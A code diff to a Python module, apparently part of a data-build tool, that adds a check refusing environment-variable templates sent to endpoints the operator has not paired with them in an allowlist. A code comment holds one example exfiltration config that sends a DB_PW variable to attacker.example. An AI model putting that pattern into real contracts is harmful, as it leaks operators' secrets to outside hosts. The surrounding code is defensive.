@@ -52,7 +52,7 @@ import logging
 import os
 import re
 from dataclasses import dataclass
-from typing import Any, Dict, List, Mapping, Optional
+from typing import Any, Dict, List, Mapping, Optional, Tuple
 
 from fluid_build._errors import FluidUserError, doc_url
 
@@ -491,6 +491,329 @@ def check_host_templates(
     walk(value, "", "")
 
 
+# ── every variable of a block, against every endpoint the contract picks for that block ──
+#
+# ``check_host_templates`` judges a variable that makes a host. This judges the variables that go
+# TO one: ``connection: {host: attacker.example, password: "{{ env.DB_PW }}"}`` sends DB_PW to
+# attacker.example whatever the variable is called, and a name cannot tell a secret from the rest
+# (``DB_PW``, ``PGPASS``, ``DATABASE_URL``). So the key is the destination, as the operator's secret
+# policy already judges it for a ``secretRef`` in the same block.
+
+
+def _value_at(node: Any, path: Tuple[Any, ...]) -> Any:
+    """What ``node`` holds at ``path`` (keys and list indexes); ``None`` for nothing."""
+    for part in path:
+        if isinstance(node, Mapping):
+            node = node.get(part)
+        elif isinstance(node, (list, tuple)) and isinstance(part, int) and 0 <= part < len(node):
+            node = node[part]
+        else:
+            return None
+    return node
+
+
+def _dotted(base: str, path: Tuple[Any, ...]) -> str:
+    """``base`` with ``path`` appended the way a field is named: ``a.b[0].c``."""
+    out = base
+    for part in path:
+        if isinstance(part, int):
+            out = f"{out}[{part}]"
+        else:
+            out = f"{out}.{part}" if out else str(part)
+    return out
+
+
+def _replaced_at(node: Any, path: Tuple[Any, ...], text: str) -> Any:
+    """A copy of ``node`` whose string at ``path`` is ``text``; what is not on the path is shared."""
+    if not path:
+        return text
+    head, rest = path[0], path[1:]
+    if isinstance(node, Mapping):
+        mapping = dict(node)
+        mapping[head] = _replaced_at(node[head], rest, text)
+        return mapping
+    if isinstance(node, (list, tuple)):
+        items = list(node)
+        items[head] = _replaced_at(node[head], rest, text)
+        return items
+    return node
+
+
+def _names_in(node: Any, where: str, found: Dict[str, str]) -> None:
+    """Each variable ``node`` names, with the first field that writes it, in the order written."""
+    if isinstance(node, str):
+        if "{{" in node:
+            for raw in ENV_TEMPLATE_RE.findall(node):
+                found.setdefault(raw.strip(), where)
+    elif isinstance(node, (list, tuple)):
+        for index, item in enumerate(node):
+            _names_in(item, f"{where}[{index}]", found)
+    elif isinstance(node, Mapping):
+        for key, item in node.items():
+            _names_in(item, f"{where}.{key}" if where else str(key), found)
+
+
+def _authority_span(text: str) -> Optional[Tuple[int, int]]:
+    """Where in ``text`` the authority is (a URL's, or the host a bare host field holds), or
+    ``None`` for a keyword/value connection string, whose host the policy does not read."""
+    url = _URL_START.match(text)
+    if url is not None:
+        return url.end(), _authority_end(text, url.end())
+    start = len(text) - len(text.lstrip())
+    if text[start:].startswith("//"):
+        start += 2
+    end = _authority_end(text, start)
+    return None if "=" in text[start:end] else (start, end)
+
+
+def _rendered_endpoint(text: str, env: Mapping[str, str]) -> Optional[str]:
+    """An endpoint field as the secret policy should judge it: its variables rendered, except a
+    host that is one whole variable, which stands as ``localhost``: the operator chose that
+    address and the contract only named the variable (:func:`check_host_templates`).
+
+    ``None`` when a variable it names is not set: :func:`render_contract` says which.
+    """
+    names = [raw.strip() for raw in ENV_TEMPLATE_RE.findall(text)]
+    if not names:
+        return text
+    if any(not _has_value(env.get(name)) for name in names):
+        return None
+    span = _authority_span(text)
+    if span is not None:
+        start, end = span
+        userinfo, at, hostport = text[start:end].rpartition("@")
+        port_at = hostport.rfind(":")
+        if port_at != -1 and hostport.find("]", port_at) == -1:
+            hostname, port = hostport[:port_at], hostport[port_at:]
+        else:
+            hostname, port = hostport, ""
+        if _is_one_template(hostname):
+            text = text[:start] + userinfo + at + "localhost" + port + text[end:]
+    return ENV_TEMPLATE_RE.sub(lambda match: env[match.group(1).strip()], text)
+
+
+def _names_no_endpoint(targets: Optional[List[Any]]) -> bool:
+    """Whether ``targets`` (:func:`~fluid_build.secrets.policy._destination_targets`) are the
+    one unreadable destination that policy adds when it found none: a block that names no
+    endpoint, as against a field that is present and blank or unreadable."""
+    return targets is not None and all(
+        t.host is None
+        and t.field is None
+        and not t.path
+        and not t.has_reason
+        and t.keyword_text is None
+        for t in targets
+    )
+
+
+def _endpoint_view(block: Mapping[str, Any], env: Mapping[str, str]) -> Optional[Mapping[str, Any]]:
+    """``block`` with only its endpoint fields rendered, for the secret policy to judge.
+
+    The endpoints are the ones ``secrets.policy`` finds in the block as written (a host, a URI,
+    a keyword string, a query string that names a host, a tunnel's host, ...). ``None`` when
+    there is nothing to judge: the block's one destination is an object store (the gap that policy
+    documents), it names no endpoint of its own (the engine's own configuration decides where it
+    connects), or an endpoint names a variable that is not set (:func:`render_contract` refuses it).
+    """
+    from fluid_build.secrets.policy import _destination_targets
+
+    targets = _destination_targets(block, None)
+    if targets is None or _names_no_endpoint(targets):
+        return None
+    view: Any = block
+    for path in dict.fromkeys(t.path for t in targets if t.path):
+        leaf = _value_at(block, path)
+        if not isinstance(leaf, str):
+            continue
+        text = _rendered_endpoint(leaf, env)
+        if text is None:
+            return None
+        view = _replaced_at(view, path, text)
+    # What the policy reads once the endpoints are rendered: a lone word such as ``localhost``
+    # under a nested field names no host there, so a block may have none left to judge.
+    after = _destination_targets(view, None)
+    return None if after is None or _names_no_endpoint(after) else view
+
+
+def _unpaired(name: str, view: Mapping[str, Any], env: Mapping[str, str]) -> bool:
+    """Whether the secret policy refuses to send variable ``name`` to every endpoint of ``view``.
+
+    One destination judgement for every kind of secret: the same
+    :func:`~fluid_build.secrets.policy.refuse_unless_allowed` a ``secretRef`` in the block meets.
+    """
+    from fluid_build.secrets.policy import AcquisitionSecretPolicyError, refuse_unless_allowed
+    from fluid_build.secrets.ref import SecretRef
+
+    try:
+        refuse_unless_allowed(
+            SecretRef(scheme="env", locator=name, written_scheme="env"),
+            connection=view,
+            environ=env,
+            rendered=True,
+        )
+    except AcquisitionSecretPolicyError:
+        return True
+    return False
+
+
+def _describe_endpoint(
+    name: str, view: Mapping[str, Any], block: Mapping[str, Any], block_where: str, env: Any
+) -> str:
+    """The endpoint of ``block`` that variable ``name`` is not paired with, as the contract wrote
+    it: a literal host by name, a host a variable makes by its field, never a rendered value."""
+    from fluid_build.secrets.policy import _destination_targets, variable_allowed
+
+    targets = _destination_targets(view, None) or []
+    for target in sorted(targets, key=lambda t: not t.has_reason):
+        if target.local or variable_allowed(
+            name, target.host, environ=env, loopback_exempt=not target.behind_tunnel
+        ):
+            continue
+        field = _dotted(block_where, target.path) if target.path else block_where
+        written = _value_at(block, target.path) if target.path else None
+        if target.host is None or target.quiet or target.keyword_text is not None:
+            return f"a destination this check cannot read ({field})"
+        if isinstance(written, str) and "{{" not in written:
+            return f"host {target.host!r} ({field})"
+        return f"the host that {field} renders to"
+    return f"an endpoint of {block_where}"
+
+
+def _pairing_refusal(
+    name: str, written_at: str, endpoint: str, *, stage: Optional[str]
+) -> EnvTemplateError:
+    """The refusal for variable ``name``, written at ``written_at``, sent to ``endpoint``."""
+    return EnvTemplateError(
+        what=(
+            f"{{{{ env.{name} }}}} is sent to {endpoint}, and the operator has not paired "
+            f"{name} with that host"
+        ),
+        where=written_at,
+        why=(
+            "A variable's value goes to every endpoint of the block that holds it, so a contract "
+            "could name any variable of the operator's environment beside a host of its own and "
+            "have the value sent there. The name cannot tell a secret from any other variable "
+            "(DB_PW, PGPASS and DATABASE_URL look like none)." + (f" ({stage})" if stage else "")
+        ),
+        fix=(
+            f"Add {name}@<that host> to FLUID_ACQUISITION_SECRET_REF_ALLOWLIST in the operator "
+            "environment (the host, without a port), give the value to the connector as a "
+            "secretRef, or write the host as one {{ env.* }} placeholder."
+        ),
+        doc=doc_url(),
+        extras={"variable": name, "field": written_at, "reason": "unpaired", "endpoint": endpoint},
+        code="EnvTemplateHostError",
+    )
+
+
+#: A block of a contract, with the path that names it.
+_Block = Tuple[str, Mapping[str, Any]]
+#: The blocks that hold the variables a destination receives, and the blocks whose endpoints
+#: receive them.
+_Group = Tuple[List[Tuple[str, Any]], List[_Block]]
+
+
+def _builds_of(contract: Mapping[str, Any]) -> List[_Block]:
+    """The builds of ``contract`` with the path that names each, or the one ``{"build": ...}``."""
+    out: List[_Block] = []
+    builds = contract.get("builds")
+    if isinstance(builds, list):
+        out.extend(
+            (f"builds[{index}]", build)
+            for index, build in enumerate(builds)
+            if isinstance(build, Mapping)
+        )
+    if isinstance(contract.get("build"), Mapping):
+        out.append(("build", contract["build"]))
+    return out
+
+
+def _blocks_of(contract: Mapping[str, Any], base: str, build: Mapping[str, Any]) -> List[_Group]:
+    """The groups of a build (:data:`_Group`).
+
+    The source: ``properties.source``, judged as a whole and as its ``connection`` (the block a
+    runner hands the policy). The sink: ``properties.sink`` and the ``binding.location`` of each
+    expose the build writes (``outputs``, else every expose), which carry the catalog's address and
+    the settings sent to it, ``catalogAuth`` included.
+    """
+    props = build.get("properties")
+    if not isinstance(props, Mapping):
+        return []
+    groups: List[_Group] = []
+    source = props.get("source")
+    if isinstance(source, Mapping):
+        where = f"{base}.properties.source"
+        judged: List[_Block] = [(where, source)]
+        if isinstance(source.get("connection"), Mapping):
+            judged.append((f"{where}.connection", source["connection"]))
+        groups.append(([(where, source)], judged))
+    sink_blocks: List[_Block] = []
+    if isinstance(props.get("sink"), Mapping):
+        sink_blocks.append((f"{base}.properties.sink", props["sink"]))
+    exposes = contract.get("exposes")
+    outputs = {o for o in (build.get("outputs") or []) if isinstance(o, str)}
+    for index, expose in enumerate(exposes if isinstance(exposes, list) else []):
+        if not isinstance(expose, Mapping):
+            continue
+        expose_id = expose.get("exposeId", expose.get("id"))
+        binding = expose.get("binding")
+        location = binding.get("location") if isinstance(binding, Mapping) else None
+        if isinstance(location, Mapping) and (not outputs or expose_id in outputs):
+            sink_blocks.append((f"exposes[{index}].binding.location", location))
+    if sink_blocks:
+        groups.append((list(sink_blocks), list(sink_blocks)))
+    return groups
+
+
+def check_env_pairing(
+    contract: Any,
+    *,
+    environ: Optional[Mapping[str, str]] = None,
+    stage: Optional[str] = None,
+) -> None:
+    """Refuse an ``{{ env.NAME }}`` that would be sent to an endpoint the contract picked.
+
+    Run on the contract as written, on the acquisition path, before
+    :func:`render_contract` expands anything. For each build, every variable, whatever it is
+    called, in the source block and in the sink blocks (:func:`_blocks_of`) renders only when each
+    endpoint of its blocks is one of:
+
+    * this machine (loopback, a local socket), or
+    * a host written as one whole ``{{ env.* }}`` (the operator chose the address), or
+    * a host the operator paired with the variable (``NAME@host`` in
+      ``FLUID_ACQUISITION_SECRET_REF_ALLOWLIST``).
+
+    The judgement is :func:`fluid_build.secrets.policy.refuse_unless_allowed`'s, the one a
+    ``secretRef`` in the block meets, so its reading of a destination (keyword strings, query
+    strings that name a host, tunnels, failover hosts, Snowflake's account) is not repeated
+    here, and a blank or unreadable endpoint refuses. A block whose one destination is an object
+    store, or that names no endpoint, passes: that is the gap the policy documents. A variable
+    that is unset is left to :func:`render_contract`, which says so.
+
+    Raises :class:`EnvTemplateError` (``EnvTemplateHostError``, reason ``unpaired``) naming the
+    variable, the field that writes it and the endpoint as written, never a rendered value.
+    """
+    if not isinstance(contract, Mapping):
+        return
+    env = os.environ if environ is None else environ
+    for base, build in _builds_of(contract):
+        for named, judged in _blocks_of(contract, base, build):
+            names: Dict[str, str] = {}
+            for where, node in named:
+                _names_in(node, where, names)
+            names = {name: at for name, at in names.items() if _has_value(env.get(name))}
+            if not names:
+                continue
+            for block_where, block in judged:
+                view = _endpoint_view(block, env)
+                if view is None:
+                    continue
+                for name, written_at in names.items():
+                    if _unpaired(name, view, env):
+                        endpoint = _describe_endpoint(name, view, block, block_where, env)
+                        raise _pairing_refusal(name, written_at, endpoint, stage=stage)
+
+
 def missing_fields(value: Any, environ: Optional[Mapping[str, str]] = None) -> Dict[str, List[str]]:
     """The variables ``value`` names that are unset or empty here, each with the fields that
     write it (``exposes[0].binding.location.bucket``), sorted by name.
@@ -531,6 +854,7 @@ __all__ = [
     "SENSITIVE_RENDER",
     "UNSET_DEFER",
     "UNSET_ERROR",
+    "check_env_pairing",
     "check_host_templates",
     "missing_fields",
     "placeholder_names",
